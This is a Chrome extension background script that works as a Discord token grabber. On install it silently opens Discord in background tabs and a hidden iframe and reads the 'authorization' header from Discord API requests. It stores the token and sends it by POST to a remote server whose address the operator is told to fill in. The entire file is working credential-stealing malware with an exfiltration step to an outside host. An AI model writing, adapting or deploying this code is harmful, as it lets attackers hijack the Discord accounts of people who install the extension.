chrome.runtime.onInstalled.addListener(() => {
    console.log('Extension Installed');
    startFetchingToken();
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "fetchToken") {
        openDiscordIframe();
    }
});

chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        for (let header of details.requestHeaders) {
            if (header.name.toLowerCase() === 'authorization') {
                const token = header.value;
                chrome.storage.local.set({ discordToken: token }, function () {
                    console.log('Token stored:', token);
                    sendTokenToServer(token);
                });
                break;
            }
        }
    },
    { urls: ["*://discord.com/api/v9/explicit-media/current-version*"] },
    ["requestHeaders"]
);

function openDiscordIframe() {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: createDiscordIframe
        });
    });
}

function createDiscordIframe() {
    let iframe = document.getElementById('discord_iframe');
    if (!iframe) {
        iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.id = 'discord_iframe';
        iframe.src = 'https://discord.com/channels/@me';
        document.body.appendChild(iframe);
    }
}

function sendTokenToServer(token) {
    console.log('Sending token to server:', token);
    fetch('http://....:5000/token', { // Replace with the url for your server.py endpoint.
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ token: token })
    })
        .then(response => response.json())
        .then(data => {
            console.log('Server response:', data);
        })
        .catch((error) => {
            console.error('Error sending token to server:', error);
        });
}

function startFetchingToken() {
    console.log('Starting to fetch token');
    let attempts = 0;
    const maxAttempts = 12;  // 1 minute
    const intervalId = setInterval(() => {
        chrome.storage.local.get(['discordToken'], (result) => {
            if (result.discordToken) {
                clearInterval(intervalId);
                sendTokenToServer(result.discordToken);
            } else if (attempts >= maxAttempts) {
                clearInterval(intervalId);
                console.log('No token found after maximum attempts');
            } else {
                attempts++;
                chrome.tabs.create({ url: "https://discord.com/channels/@me", active: false }, (tab) => {
                    chrome.tabs.onUpdated.addListener(function listener(tabId, info) {
                        if (tabId === tab.id && info.status === 'complete') {
                            openDiscordIframe();
                            chrome.tabs.onUpdated.removeListener(listener);
                        }
                    });
                });
                console.log('Discord iframe opened, attempt:', attempts);
            }
        });
    }, 10000); // Increased interval to reduce frequency of requests
}
